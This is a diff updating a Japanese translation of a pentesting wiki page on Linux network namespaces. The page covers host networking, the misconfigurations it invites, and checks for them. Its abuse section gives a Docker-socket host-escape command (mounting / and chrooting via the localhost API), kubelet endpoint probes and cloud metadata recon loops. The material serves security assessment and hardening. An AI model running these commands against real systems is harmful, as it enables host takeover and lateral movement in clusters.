@@ -4,66 +4,81 @@
 
 ## 概要
 
-ネットワーク名前空間は、インターフェース、IPアドレス、ルーティングテーブル、ARP/ネイバー状態、ファイアウォールルール、ソケット、`/proc/net` のようなファイルの内容など、ネットワーク関連のリソースを分離します。これにより、コンテナはホストの実際のネットワークスタックを所有していなくても、自分専用の `eth0`、ローカルルート、ループバックデバイスを持っているように見えることがあります。
+ネットワーク名前空間は、インターフェイス、IPアドレス、ルーティングテーブル、ARP/neighbor 状態、ファイアウォールルール、ソケット、そして `/proc/net` のようなファイルの内容など、ネットワークに関連するリソースを分離します。これにより、コンテナはホストの実際のネットワークスタックを所有していなくても、あたかも独自の `eth0`、独自のローカルルート、独自のループバックデバイスを持っているかのように見えます。
 
-セキュリティの観点では、ネットワーク分離はポートバインディング以上の意味を持つため重要です。プライベートなネットワーク名前空間は、ワークロードが直接観察したり再構成したりできる範囲を制限します。その名前空間がホストと共有されると、コンテナは突然ホストのリスナー、ホストローカルサービス、アプリケーションに公開されるべきではないネットワーク制御ポイントを可視化できるようになる可能性があります。
+セキュリティの観点では、ネットワーク分離は単なるポートバインディング以上の意味を持ちます。プライベートなネットワーク名前空間は、ワークロードが直接観察したり再設定したりできる範囲を制限します。その名前空間がホストと共有されると、コンテナは意図せずにホスト上のリスナー、ホストローカルなサービス、そしてアプリケーションに公開されるべきではなかったネットワーク制御ポイントを見ることができるようになります。
 
 ## 動作
 
-新しく作成されたネットワーク名前空間は、インターフェースがアタッチされるまで空かほぼ空のネットワーク環境で始まります。コンテナランタイムはその後、仮想インターフェースを作成または接続し、アドレスを割り当て、ルートを設定してワークロードに期待される接続を提供します。bridge-based のデプロイでは、通常コンテナはホストブリッジに接続された veth-backed インターフェースを見ます。Kubernetes では CNI プラグインが Pod ネットワーキングの同等のセットアップを処理します。
+新しく作成されたネットワーク名前空間は、インターフェイスが割り当てられるまで空、あるいはほぼ空のネットワーク環境として始まります。コンテナランタイムはその後、仮想インターフェイスを作成または接続し、アドレスを割り当て、ワークロードが期待する接続性を得られるようルートを設定します。ブリッジベースのデプロイでは、通常コンテナはホストのブリッジに接続された veth で接続されたインターフェイスを目にします。Kubernetes では、CNI プラグインが Pod のネットワーキングに相当するセットアップを担当します。
 
-このアーキテクチャは、`--network=host` や `hostNetwork: true` がなぜこれほど劇的な変化なのかを説明します。準備されたプライベートなネットワークスタックを受け取る代わりに、ワークロードはホストの実際のスタックに参加します。
+このアーキテクチャは、`--network=host` や `hostNetwork: true` がなぜ極めて大きな変更なのかを説明します。準備されたプライベートなネットワークスタックを受け取る代わりに、ワークロードはホストの実際のスタックに参加することになります。
 
-## 演習
+## ラボ
 
-ほぼ空のネットワーク名前空間は次の方法で確認できます:
+ほぼ空のネットワーク名前空間は次のように確認できます：
 ```bash
 sudo unshare --net --fork bash
 ip addr
 ip route
 ```
-また、通常のコンテナとホストネットワーク化されたコンテナを次のように比較できます:
+また、通常のコンテナとホストネットワークのコンテナを次のように比較できます：
 ```bash
 docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
 docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
 ```
-The host-networked container no longer has its own isolated socket and interface view. That change alone is already significant before you even ask what capabilities the process has.
+ホストのネットワークを共有するコンテナは、もはや独自の分離されたソケットやインターフェースのビューを持ちません。その変化だけでも、プロセスがどのような権限を持っているかを問う前に重大です。
 
-## Runtime Usage
+## 実行時の使用
 
-Docker と Podman は通常、設定がない限り各 container ごとに private network namespace を作成します。Kubernetes は通常各 Pod に専用の network namespace を割り当て、Pod 内の container で共有されますが host とは分離されています。Incus/LXC システムも network-namespace ベースの隔離機能を豊富に提供しており、多様な仮想ネットワーク構成を扱えます。
+Docker と Podman は通常、設定しない限り各コンテナに対してプライベートな network namespace を作成します。Kubernetes は通常、各 Pod に対して独自の network namespace を割り当て、Pod 内のコンテナ間で共有されるがホストとは分離されます。Incus/LXC システムも network namespace を基盤とした隔離機能を提供し、より多様な仮想ネットワーキング構成をサポートすることが多いです。
 
-一般的な原則は、private networking がデフォルトの隔離境界であり、host networking はその境界から明示的にオプトアウトする設定だということです。
+一般的な原則は、プライベートなネットワークがデフォルトの隔離境界であり、host networking はその境界から明示的にオプトアウトするものだという点です。
 
-## Misconfigurations
+## 誤設定
 
-最も重要な misconfiguration は単純に host network namespace を共有してしまうことです。これはパフォーマンス向上、低レベルのモニタリング、あるいは利便性のために行われることがありますが、container にとって利用可能ないちばん明確な境界の一つを取り除いてしまいます。Host-local な listeners がより直接的に到達可能になり、localhost 専用のサービスにアクセスできるようになることがあり、`CAP_NET_ADMIN` や `CAP_NET_RAW` のような capabilities は、これらが有効にする操作が host 自体のネットワーク環境に対して行われるため、はるかに危険になります。
+最も重要な誤設定は、単純にホストの network namespace を共有することです。これはパフォーマンス向上、低レベルの監視、あるいは利便性のために行われることがありますが、コンテナに対して利用可能な最も明確な境界の一つを失わせます。ホストローカルのリスナーによりより直接的に到達可能になり、localhost 専用のサービスがアクセス可能になる場合があり、`CAP_NET_ADMIN` や `CAP_NET_RAW` のような権限は、これらがホスト自身のネットワーク環境に対して適用されるため、はるかに危険になります。
 
-別の問題は、network namespace が private であってもネットワーク関連の capabilities を過剰に付与してしまうことです。private namespace は助けになりますが、raw sockets や高度なネットワーク制御を無害にするわけではありません。
+ネットワーク namespace がプライベートであっても、ネットワーク関連の権限を過剰に与えることは別の問題です。プライベートな namespace は一定の助けになりますが、生のソケットや高度なネットワーク制御が無害になるわけではありません。
 
-## Abuse
+Kubernetes では、`hostNetwork: true` は Pod レベルのネットワーク分割にどれだけ信頼を置けるかも変えます。Kubernetes のドキュメントは、多くの network plugins が `hostNetwork` Pod のトラフィックを `podSelector` / `namespaceSelector` のマッチングで適切に区別できず、そのため通常のノードトラフィックとして扱うことを指摘しています。攻撃者の観点では、これは侵害された `hostNetwork` ワークロードをオーバーレイネットワーク上のワークロードと同じポリシー前提で制約された通常の Pod と見なすのではなく、ノードレベルのネットワーク足場として扱うべきであることを意味します。
 
-隔離が弱い環境では、攻撃者は host の listening サービスを調べたり、loopback にのみバインドされた管理エンドポイントに到達したり、具体的な capabilities や環境次第でトラフィックをスニッフィング／妨害したり、`CAP_NET_ADMIN` があると routing や firewall の状態を再構成したりする可能性があります。クラスタ環境では、これにより lateral movement や control-plane の偵察が容易になることもあります。
+## 悪用
 
-If you suspect host networking, start by confirming that the visible interfaces and listeners belong to the host rather than to an isolated container network:
+隔離が弱い構成では、攻撃者はホスト上のリスニングサービスを調べたり、loopback にのみバインドされた管理エンドポイントに到達したり、環境や付与された権限によってはトラフィックをスニッフィングしたり妨害したり、`CAP_NET_ADMIN` がある場合にはルーティングやファイアウォールの状態を再構成したりする可能性があります。クラスタ内では、これにより横移動やコントロールプレーンの偵察が容易になることもあります。
+
+ホストネットワーキングが疑われる場合は、まず表示されているインターフェースやリスナーが分離されたコンテナのネットワークではなくホストに属していることを確認してください:
 ```bash
 ip addr
 ip route
 ss -lntup | head -n 50
 ```
-Loopback-only services はしばしば最初に興味深い発見となる:
+Loopback-onlyサービスは、多くの場合、最初に興味深い発見になります:
 ```bash
 ss -lntp | grep '127.0.0.1'
 curl -s http://127.0.0.1:2375/version 2>/dev/null
 curl -sk https://127.0.0.1:2376/version 2>/dev/null
 ```
-ネットワーク機能がある場合、ワークロードが表示されているスタックを検査または変更できるかをテストする:
+ネットワーク capabilities が存在する場合、ワークロードが可視スタックを検査または変更できるかをテストしてください:
 ```bash
 capsh --print | grep -E 'cap_net_admin|cap_net_raw'
 iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
 ip link show
 ```
-クラスターやクラウド環境では、ホストのネットワーキングにより、メタデータやコントロールプレーンに隣接するサービスのローカルでの迅速なreconも正当化されます:
+最新のカーネルでは、ホストのネットワーキングと `CAP_NET_ADMIN` を組み合わせることで、単なる `iptables` / `nftables` の変更を超えてパケット経路が露出することがあります。`tc` の qdiscs と filters もネームスペース単位で適用されるため、ホストのネットワークネームスペースを共有している場合、それらはコンテナから見えるホストのインターフェースに適用されます。さらに `CAP_BPF` が存在する場合、TC や XDP ローダーなどのネットワーク関連の eBPF プログラムも関係してきます:
+```bash
+capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
+for i in $(ls /sys/class/net 2>/dev/null); do
+echo "== $i =="
+tc qdisc show dev "$i" 2>/dev/null
+tc filter show dev "$i" ingress 2>/dev/null
+tc filter show dev "$i" egress 2>/dev/null
+done
+bpftool net 2>/dev/null
+```
+これは重要です。attacker は、firewall rules を書き換えるだけでなく、host interface レベルでトラフィックを mirror、redirect、shape、drop できる可能性があるからです。private network namespace 内ではこれらの操作は container のビューに封じられますが、shared host namespace では host-impacting になります。
+
+cluster や cloud 環境では、host networking はまた metadata や control-plane-adjacent services の素早いローカル recon を正当化します：
 ```bash
 for u in \
 http://169.254.169.254/latest/meta-data/ \
@@ -74,36 +89,48 @@ done
 ```
 ### 完全な例: Host Networking + Local Runtime / Kubelet Access
 
-Host networking は自動的に host root を提供するわけではありませんが、しばしばノード自身からのみ到達可能なよう意図的に公開されているサービスを露出します。これらのサービスのいずれかが保護が甘い場合、Host networking は直接的な privilege-escalation の経路になります。
+host networking は自動的に host root を提供するわけではありませんが、ノード自身からのみ到達可能に意図されたサービスをしばしば露出します。これらのサービスのうちの一つが弱く保護されていると、host networking は直接的な privilege-escalation の経路になります。
 
 Docker API on localhost:
 ```bash
 curl -s http://127.0.0.1:2375/version 2>/dev/null
 docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
 ```
-localhost上のKubelet:
+localhost 上の Kubelet:
 ```bash
 curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
 curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
 ```
 影響:
 
-- 適切な保護なしにローカルのランタイムAPIが公開されている場合、ホストが直接侵害される可能性がある
-- kubelet やローカルエージェントに到達可能な場合、クラスタの偵察や横移動が行われる可能性がある
-- `CAP_NET_ADMIN` と組み合わされると、トラフィックの改ざんやサービス拒否が発生する可能性がある
+- ローカルのランタイム API が適切に保護されていない場合、ホストが直接侵害される可能性がある
+- kubelet またはローカルエージェントに到達できる場合、cluster reconnaissance や lateral movement につながる可能性がある
+- `CAP_NET_ADMIN` と組み合わせると、トラフィックの操作や denial of service を引き起こす可能性がある
 
 ## チェック
 
-これらのチェックの目的は、プロセスがプライベートなネットワークスタックを持っているか、どのルートとリスナーが見えているか、そして capabilities を実際にテストする前にネットワークの見え方がすでにホストに似ているかどうかを把握することです。
+これらのチェックの目的は、プロセスがプライベートなネットワークスタックを持っているか、どのルートやリスナーが見えているか、そして実際に capabilities をテストする前にネットワークの見え方が既にホストに似ているかどうかを把握することです。
 ```bash
-readlink /proc/self/ns/net   # Network namespace identifier
+readlink /proc/self/ns/net   # Current network namespace identifier
+readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
+lsns -t net 2>/dev/null      # Reachable network namespaces from this view
+ip netns identify $$ 2>/dev/null
 ip addr                      # Visible interfaces and addresses
 ip route                     # Routing table
 ss -lntup                    # Listening TCP/UDP sockets with process info
 ```
-- namespace identifier や表示されるインターフェースのセットがホストと同じに見える場合、host networking が既に使われている可能性があります。
-- `ss -lntup` は特に有用です。ループバック限定のリスナーやローカル管理用エンドポイントを明らかにします。
-- ルート、インターフェース名、ファイアウォールのコンテキストは、`CAP_NET_ADMIN` または `CAP_NET_RAW` が存在する場合により重要になります。
+ここで興味深い点：
 
-コンテナをレビューする際は、必ず network namespace を capability set と合わせて評価してください。host networking と強力なネットワーク capability の組み合わせは、bridge networking と限定的なデフォルト capability set の組み合わせとはまったく異なる態勢です。
+- If `/proc/self/ns/net` and `/proc/1/ns/net` already look host-like, the container may be sharing the host network namespace or another non-private namespace.
+- `lsns -t net` and `ip netns identify` are useful when the shell is already inside a named or persistent namespace and you want to correlate it with `/run/netns` objects from the host side.
+- `ss -lntup` is especially valuable because it reveals loopback-only listeners and local management endpoints.
+- Routes, interface names, firewall context, `tc` state, and eBPF attachments become much more important if `CAP_NET_ADMIN`, `CAP_NET_RAW`, or `CAP_BPF` is present.
+- In Kubernetes, failed service-name resolution from a `hostNetwork` Pod may simply mean the Pod is not using `dnsPolicy: ClusterFirstWithHostNet`, not that the service is absent.
+
+コンテナを確認する際は、ネットワーク名前空間を capability セットと合わせて常に評価してください。ホストネットワーキングと強力なネットワーク capability の組み合わせは、ブリッジネットワーキングと限定されたデフォルト capability セットとは全く異なる姿勢です。
+
+## 参考資料
+
+- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
+- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
 {{#include ../../../../../banners/hacktricks-training.md}}
